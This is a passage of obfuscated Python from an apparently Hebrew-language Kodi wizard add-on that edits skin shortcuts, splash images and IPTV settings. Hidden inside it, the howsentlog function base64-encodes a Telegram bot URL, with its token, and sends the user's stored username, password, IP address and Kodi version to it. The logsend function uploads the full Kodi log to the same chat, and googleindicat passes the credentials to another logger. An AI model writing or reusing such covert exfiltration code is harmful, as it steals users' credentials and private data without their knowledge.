    <controls>
        <control type="group">
            <top>210</top>
            <bottom>64</bottom>
            <left>0</left>
            <right>0</right>
            <include>Animation_SlideIn</include>
            <include>Animation_FadeOut</include>
            <animation effect="slide" tween="quadratic" easing="out" time="300" start="0,1920" end="0">WindowOpen</animation>
            <animation effect="slide" tween="quadratic" easing="in" time="300" end="0,1920" start="0">WindowClose</animation>
            <include>Dialog_Background</include>
            <control type="group">
                <top>70</top>
                <right>side</right>
                <left>1430</left>
                <align>right</align>
                <height>621</height>
                <control type="group">
                    <width>460</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="460" />
                        <param name="label" value="$INFO[Control.GetLabel(20)]" />
                    </include>
                    <!-- <include>Object_FlatBackground</include> -->
                    <control type="grouplist" id="3">
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onleft>5</onleft>
                        <onright>5</onright>
                        <width>100%</width>
						<align>right</align>
                        <height>621</height>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control>

                <control type="group">
                    <right>480</right>
                    <width>1400</width>
                    <height>621</height>
                    <include content="Object_Line_Settings">
                        <param name="width" value="1400" />
                        <param name="label" value="$LOCALIZE[33063]" />
                    </include>
					
                    <control type="grouplist" id="5">
                        <width>100%</width>
                        <height>621</height>
                        <ondown>8000</ondown>
                        <onup>noop</onup>
                        <onright>3</onright>
                        <onleft>8000</onleft>
                        <orientation>vertical</orientation>
                        <itemgap>0</itemgap>
                    </control>
                </control> 

            </control>

            <!-- Default Templates -->
            <control type="button" id="7">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="radiobutton" id="8">
                <width>100%</width>
                <align>right</align>
                <radioposx>40</radioposx>
                <include>Defs_OptionButton</include>
            </control>
            <control type="spincontrolex" id="9">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="image" id="11">
                <width>100%</width>
                <height>72</height>
                <texture border="30">common/div.png</texture>
                <include>Defs_OptionButton</include>
            </control>
            <control type="edit" id="12">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>
            <control type="label" id="14">
                <width>100%</width>
                <height>72</height>
                <align>right</align>
                <font>Font-ListInfo-Small-Bold</font>
                <textcolor>LineLabel</textcolor>
            </control>
            <control type="sliderex" id="13">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Default Templates Category -->
            <control type="button" id="10">
                <width>100%</width>
                <include>Defs_OptionButton</include>
            </control>

            <!-- Ok Cancel Defaults -->
            <control type="grouplist" id="8000">
                <centerleft>50%</centerleft>
                <width>1240</width>
                <bottom>side</bottom>
                <height>69</height>
                <align>center</align>
                <itemgap>20</itemgap>
                <onleft>3</onleft>
                <onright>3</onright>
                <onup>3</onup>
                <ondown>noop</ondown>
                <orientation>horizontal</orientation>
                <control type="button" id="28">
                    <align>center</align>
                    <width>400</width>
                    <label>186</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(10)</visible>
                </control>
                <control type="button" id="29">
                    <align>center</align>
                    <width>400</width>
                    <label>222</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(11)</visible>
                </control>
                <control type="button" id="30">
                    <align>center</align>
                    <width>400</width>
                    <label>409</label>
                    <include>Defs_OptionButton2</include>
                    <visible>Control.IsEnabled(12)</visible>
                </control>
            </control>
        </control>
        <control type="label" id="2"><width>1</width><top>-2000</top><height>1</height><visible>false</visible></control>

    </controls>

</window>
''')#line:817
    with open (O00OO0OOOO000O0OO ,'w')as O0O00O00O0OOOO000 :#line:820
      O0O00O00O0OOOO000 .write (O0OOO0OO0OO0OOOOO )#line:821
def testcommand ():#line:822
    xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Addons.SetAddonEnabled","params":{"addonid":"service.xbmc.versioncheck","enabled":false},"id":1}')#line:823
def skin_homeselect ():#line:825
	try :#line:827
		OO0OOO0OOOO0O0OO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:828
		OOOO00O00O0OOOO0O =open (OO0OOO0OOOO0O0OO0 ,'r')#line:830
		OO000O00OO000OO0O =OOOO00O00O0OOOO0O .read ()#line:831
		OOOO00O00O0OOOO0O .close ()#line:832
		O0O00O0O00O0O000O ='<setting id="HomeS" type="string(.+?)/setting>'#line:833
		OO0OOOOOOO00OO00O =re .compile (O0O00O0O00O0O000O ).findall (OO000O00OO000OO0O )[0 ]#line:834
		OOOO00O00O0OOOO0O =open (OO0OOO0OOOO0O0OO0 ,'w')#line:835
		OOOO00O00O0OOOO0O .write (OO000O00OO000OO0O .replace ('<setting id="HomeS" type="string%s/setting>'%OO0OOOOOOO00OO00O ,'<setting id="HomeS" type="string"></setting>'))#line:836
		OOOO00O00O0OOOO0O .close ()#line:837
	except :#line:838
		pass #line:839
def autotrakt ():#line:842
    O000OOO0OOOO0O000 =(ADDON .getSetting ("auto_trk"))#line:843
    if O000OOO0OOOO0O000 =='true':#line:844
       from resources .libs import trk_aut #line:845
def traktsync ():#line:847
     O0OO000OO0OO0OO00 =(ADDON .getSetting ("auto_trk"))#line:848
     if O0OO000OO0OO0OO00 =='true':#line:849
       from resources .libs import trk_aut #line:852
     else :#line:853
        ADDON .openSettings ()#line:854
def imdb_synck ():#line:856
   try :#line:857
     OO00OO0OO00O000OO =xbmcaddon .Addon ('plugin.video.exodusredux')#line:858
     O0OOOOOO00OO0O00O =xbmcaddon .Addon ('plugin.video.gaia')#line:859
     OOO0O0000O00O0O00 =(ADDON .getSetting ("imdb_sync"))#line:860
     OOO00OOOOO000OOOO ="imdb.user"#line:861
     O0O000OOOO00OOO00 ="accounts.informants.imdb.user"#line:862
     OO00OO0OO00O000OO .setSetting (OOO00OOOOO000OOOO ,str (OOO0O0000O00O0O00 ))#line:863
     O0OOOOOO00OO0O00O .setSetting ('accounts.informants.imdb.enabled','true')#line:864
     O0OOOOOO00OO0O00O .setSetting (O0O000OOOO00OOO00 ,str (OOO0O0000O00O0O00 ))#line:865
   except :pass #line:866
def dis_or_enable_addon (OOO000O0OOOOOOOO0 ,OO000OOO00000OOO0 ,enable ="true"):#line:868
    import json #line:869
    O00O00OO0OO0OO00O ='"%s"'%OOO000O0OOOOOOOO0 #line:870
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%OOO000O0OOOOOOOO0 )and enable =="true":#line:871
        logging .warning ('already Enabled')#line:872
        return xbmc .log ("### Skipped %s, reason = allready enabled"%OOO000O0OOOOOOOO0 )#line:873
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%OOO000O0OOOOOOOO0 )and enable =="false":#line:874
        return xbmc .log ("### Skipped %s, reason = not installed"%OOO000O0OOOOOOOO0 )#line:875
    else :#line:876
        OOOOO00O00O0O0000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(O00O00OO0OO0OO00O ,enable )#line:877
        O0O0OO000O0OO0O0O =xbmc .executeJSONRPC (OOOOO00O00O0O0000 )#line:878
        O0000OOOOO0O0OOO0 =json .loads (O0O0OO000O0OO0O0O )#line:879
        if enable =="true":#line:880
            xbmc .log ("### Enabled %s, response = %s"%(OOO000O0OOOOOOOO0 ,O0000OOOOO0O0OOO0 ))#line:881
        else :#line:882
            xbmc .log ("### Disabled %s, response = %s"%(OOO000O0OOOOOOOO0 ,O0000OOOOO0O0OOO0 ))#line:883
    if OO000OOO00000OOO0 =='auto':#line:884
     return True #line:885
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:886
def iptvset ():#line:889
  try :#line:890
    O000O00OOOOOO0OO0 =(ADDON .getSetting ("iptv_on"))#line:891
    if O000O00OOOOOO0OO0 =='true':#line:893
       if KODIV >=17 and KODIV <18 :#line:895
         dis_or_enable_addon (('pvr.iptvsimple'),mode )#line:896
         OO0O000OO00OOO000 =xbmcaddon .Addon ('pvr.iptvsimple')#line:897
         O0OOOOOO000OOOO0O =(ADDON .getSetting ("iptvUrl"))#line:899
         OO0O000OO00OOO000 .setSetting ('m3uUrl',O0OOOOOO000OOOO0O )#line:900
         OOO00O000O000OOOO =(ADDON .getSetting ("epg_Url"))#line:901
         OO0O000OO00OOO000 .setSetting ('epgUrl',OOO00O000O000OOOO )#line:902
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.windows'):#line:905
         iptvsimpldownpc ()#line:906
         wiz .kodi17Fix ()#line:907
         xbmc .sleep (1000 )#line:908
         OO0O000OO00OOO000 =xbmcaddon .Addon ('pvr.iptvsimple')#line:909
         O0OOOOOO000OOOO0O =(ADDON .getSetting ("iptvUrl"))#line:910
         OO0O000OO00OOO000 .setSetting ('m3uUrl',O0OOOOOO000OOOO0O )#line:911
         OOO00O000O000OOOO =(ADDON .getSetting ("epg_Url"))#line:912
         OO0O000OO00OOO000 .setSetting ('epgUrl',OOO00O000O000OOOO )#line:913
       if KODIV >=18 and xbmc .getCondVisibility ('system.platform.android'):#line:915
         iptvsimpldown ()#line:916
         wiz .kodi17Fix ()#line:917
         xbmc .sleep (1000 )#line:918
         OO0O000OO00OOO000 =xbmcaddon .Addon ('pvr.iptvsimple')#line:919
         O0OOOOOO000OOOO0O =(ADDON .getSetting ("iptvUrl"))#line:920
         OO0O000OO00OOO000 .setSetting ('m3uUrl',O0OOOOOO000OOOO0O )#line:921
         OOO00O000O000OOOO =(ADDON .getSetting ("epg_Url"))#line:922
         OO0O000OO00OOO000 .setSetting ('epgUrl',OOO00O000O000OOOO )#line:923
  except :pass #line:924
def howsentlog ():#line:931
       try :#line:932
          import json #line:933
          OO0000OO00OOO0OO0 =(ADDON .getSetting ("user"))#line:934
          OOOOO0OOO00O0O00O =(ADDON .getSetting ("pass"))#line:935
          O0000O000OO000OO0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:936
          OOOOOO00O0O0OO000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:938
          OO0OOO00000OOOOO0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:939
          O0000OO0O00OO00OO =str (json .loads (OO0OOO00000OOOOO0 )['ip'])#line:940
          O0O0000O00O00OO0O =OO0000OO00OOO0OO0 #line:941
          OOOOO0OOOOOO0O000 =OOOOO0OOO00O0O00O #line:942
          import socket #line:944
          OO0OOO00000OOOOO0 =urllib2 .urlopen (OOOOOO00O0O0OO000 .decode ('base64')+' - '+O0O0000O00O00OO0O +' - '+OOOOO0OOOOOO0O000 +' - '+O0000O000OO000OO0 ).readlines ()#line:945
       except :pass #line:946
def googleindicat ():#line:949
			import logg #line:950
			O00O00OO00OOOOOOO =(ADDON .getSetting ("pass"))#line:951
			OOOO0000OO0O0OOO0 =(ADDON .getSetting ("user"))#line:952
			logg .logGA (O00O00OO00OOOOOOO ,OOOO0000OO0O0OOO0 )#line:953
def logsend ():#line:954
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:955
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:956
      howsentlog ()#line:958
      import requests #line:959
      if xbmc .getCondVisibility ('system.platform.windows'):#line:960
         OOO00OO0O0O0O00OO =xbmc .translatePath ('special://home/kodi.log')#line:961
         O0OOOO0000O0O0OOO ={'chat_id':(None ,'-274262389'),'document':(OOO00OO0O0O0O00OO ,open (OOO00OO0O0O0O00OO ,'rb')),}#line:965
         OOO0O0000OOO00O0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:966
         O00O0OO00O0OOOOOO =requests .post (OOO0O0000OOO00O0O .decode ('base64'),files =O0OOOO0000O0O0OOO )#line:968
      elif xbmc .getCondVisibility ('system.platform.android'):#line:969
           OOO00OO0O0O0O00OO =xbmc .translatePath ('special://temp/kodi.log')#line:970
           O0OOOO0000O0O0OOO ={'chat_id':(None ,'-274262389'),'document':(OOO00OO0O0O0O00OO ,open (OOO00OO0O0O0O00OO ,'rb')),}#line:974
           OOO0O0000OOO00O0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:975
           O00O0OO00O0OOOOOO =requests .post (OOO0O0000OOO00O0O .decode ('base64'),files =O0OOOO0000O0O0OOO )#line:977
      else :#line:978
           OOO00OO0O0O0O00OO =xbmc .translatePath ('special://kodi.log')#line:979
           O0OOOO0000O0O0OOO ={'chat_id':(None ,'-274262389'),'document':(OOO00OO0O0O0O00OO ,open (OOO00OO0O0O0O00OO ,'rb')),}#line:983
           OOO0O0000OOO00O0O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:984
           O00O0OO00O0OOOOOO =requests .post (OOO0O0000OOO00O0O .decode ('base64'),files =O0OOOO0000O0O0OOO )#line:986
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:987
def rdoff ():#line:989
	O000OOOOO0O00OOO0 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:1020
	OOOO0O000000O00OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1021
	copyfile (O000OOOOO0O00OOO0 ,OOOO0O000000O00OO )#line:1022
def skindialogsettind18 ():#line:1023
	try :#line:1024
		O0O00O0OOOOO0OOO0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:1025
		O00OOOOO0O0O0O00O =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:1026
		copyfile (O0O00O0OOOOO0OOO0 ,O00OOOOO0O0O0O00O )#line:1027
	except :pass #line:1028
def rdon ():#line:1029
	loginit .loginIt ('restore','all')#line:1030
	OO0O0OOO0OO0O00O0 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:1032
	OOOO00OO0OOOOOO0O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1033
	copyfile (OO0O0OOO0OO0O00O0 ,OOOO00OO0OOOOOO0O )#line:1034
def adults18 ():#line:1036
  OO0OOO000OOO000O0 =(ADDON .getSetting ("adults"))#line:1037
  if OO0OOO000OOO000O0 =='true':#line:1038
    OO00O0O00O00OOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1039
    with open (OO00O0O00O00OOOOO ,'r')as OOOOO0O00000O0O00 :#line:1040
      O0O0000O00OO0O00O =OOOOO0O00000O0O00 .read ()#line:1041
    O0O0000O00OO0O00O =O0O0000O00OO0O00O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1059
    with open (OO00O0O00O00OOOOO ,'w')as OOOOO0O00000O0O00 :#line:1062
      OOOOO0O00000O0O00 .write (O0O0000O00OO0O00O )#line:1063
def rdbuildaddon ():#line:1064
  O0OO0O0000O0OOO0O =(ADDON .getSetting ("auto_rd"))#line:1065
  if O0OO0O0000O0OOO0O =='true':#line:1066
    OO00O0O000OO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1067
    with open (OO00O0O000OO000O0 ,'r')as O00O0OOOO00O00O00 :#line:1068
      O00OOOOOO0O0O0000 =O00O0OOOO00O00O00 .read ()#line:1069
    O00OOOOOO0O0O0000 =O00OOOOOO0O0O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1087
    with open (OO00O0O000OO000O0 ,'w')as O00O0OOOO00O00O00 :#line:1090
      O00O0OOOO00O00O00 .write (O00OOOOOO0O0O0000 )#line:1091
    OO00O0O000OO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1095
    with open (OO00O0O000OO000O0 ,'r')as O00O0OOOO00O00O00 :#line:1096
      O00OOOOOO0O0O0000 =O00O0OOOO00O00O00 .read ()#line:1097
    O00OOOOOO0O0O0000 =O00OOOOOO0O0O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1115
    with open (OO00O0O000OO000O0 ,'w')as O00O0OOOO00O00O00 :#line:1118
      O00O0OOOO00O00O00 .write (O00OOOOOO0O0O0000 )#line:1119
    OO00O0O000OO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1123
    with open (OO00O0O000OO000O0 ,'r')as O00O0OOOO00O00O00 :#line:1124
      O00OOOOOO0O0O0000 =O00O0OOOO00O00O00 .read ()#line:1125
    O00OOOOOO0O0O0000 =O00OOOOOO0O0O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1143
    with open (OO00O0O000OO000O0 ,'w')as O00O0OOOO00O00O00 :#line:1146
      O00O0OOOO00O00O00 .write (O00OOOOOO0O0O0000 )#line:1147
    OO00O0O000OO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1151
    with open (OO00O0O000OO000O0 ,'r')as O00O0OOOO00O00O00 :#line:1152
      O00OOOOOO0O0O0000 =O00O0OOOO00O00O00 .read ()#line:1153
    O00OOOOOO0O0O0000 =O00OOOOOO0O0O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1171
    with open (OO00O0O000OO000O0 ,'w')as O00O0OOOO00O00O00 :#line:1174
      O00O0OOOO00O00O00 .write (O00OOOOOO0O0O0000 )#line:1175
    OO00O0O000OO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1178
    with open (OO00O0O000OO000O0 ,'r')as O00O0OOOO00O00O00 :#line:1179
      O00OOOOOO0O0O0000 =O00O0OOOO00O00O00 .read ()#line:1180
    O00OOOOOO0O0O0000 =O00OOOOOO0O0O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1198
    with open (OO00O0O000OO000O0 ,'w')as O00O0OOOO00O00O00 :#line:1201
      O00O0OOOO00O00O00 .write (O00OOOOOO0O0O0000 )#line:1202
    OO00O0O000OO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1204
    with open (OO00O0O000OO000O0 ,'r')as O00O0OOOO00O00O00 :#line:1205
      O00OOOOOO0O0O0000 =O00O0OOOO00O00O00 .read ()#line:1206
    O00OOOOOO0O0O0000 =O00OOOOOO0O0O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1224
    with open (OO00O0O000OO000O0 ,'w')as O00O0OOOO00O00O00 :#line:1227
      O00O0OOOO00O00O00 .write (O00OOOOOO0O0O0000 )#line:1228
    OO00O0O000OO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1230
    with open (OO00O0O000OO000O0 ,'r')as O00O0OOOO00O00O00 :#line:1231
      O00OOOOOO0O0O0000 =O00O0OOOO00O00O00 .read ()#line:1232
    O00OOOOOO0O0O0000 =O00OOOOOO0O0O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1250
    with open (OO00O0O000OO000O0 ,'w')as O00O0OOOO00O00O00 :#line:1253
      O00O0OOOO00O00O00 .write (O00OOOOOO0O0O0000 )#line:1254
    OO00O0O000OO000O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1257
    with open (OO00O0O000OO000O0 ,'r')as O00O0OOOO00O00O00 :#line:1258
      O00OOOOOO0O0O0000 =O00O0OOOO00O00O00 .read ()#line:1259
    O00OOOOOO0O0O0000 =O00OOOOOO0O0O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1277
    with open (OO00O0O000OO000O0 ,'w')as O00O0OOOO00O00O00 :#line:1280
      O00O0OOOO00O00O00 .write (O00OOOOOO0O0O0000 )#line:1281
def rdbuildinstall ():#line:1284
  try :#line:1285
   O0000OO0OO00O0O0O =(ADDON .getSetting ("auto_rd"))#line:1286
   if O0000OO0OO00O0O0O =='true':#line:1287
     OO0OO00O000O00OOO =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:1288
     O00OO0O0OO000OOO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1289
     copyfile (OO0OO00O000O00OOO ,O00OO0O0OO000OOO0 )#line:1290
  except :#line:1291
     pass #line:1292
def rdbuildaddonoff ():#line:1295
    OO0O00OOOOOOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1298
    with open (OO0O00OOOOOOOOO0O ,'r')as O0000OOOOOOOO0O0O :#line:1299
      OOOOO0O0OOO0O0000 =O0000OOOOOOOO0O0O .read ()#line:1300
    OOOOO0O0OOO0O0000 =OOOOO0O0OOO0O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1318
    with open (OO0O00OOOOOOOOO0O ,'w')as O0000OOOOOOOO0O0O :#line:1321
      O0000OOOOOOOO0O0O .write (OOOOO0O0OOO0O0000 )#line:1322
    OO0O00OOOOOOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1326
    with open (OO0O00OOOOOOOOO0O ,'r')as O0000OOOOOOOO0O0O :#line:1327
      OOOOO0O0OOO0O0000 =O0000OOOOOOOO0O0O .read ()#line:1328
    OOOOO0O0OOO0O0000 =OOOOO0O0OOO0O0000 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1346
    with open (OO0O00OOOOOOOOO0O ,'w')as O0000OOOOOOOO0O0O :#line:1349
      O0000OOOOOOOO0O0O .write (OOOOO0O0OOO0O0000 )#line:1350
    OO0O00OOOOOOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1354
    with open (OO0O00OOOOOOOOO0O ,'r')as O0000OOOOOOOO0O0O :#line:1355
      OOOOO0O0OOO0O0000 =O0000OOOOOOOO0O0O .read ()#line:1356
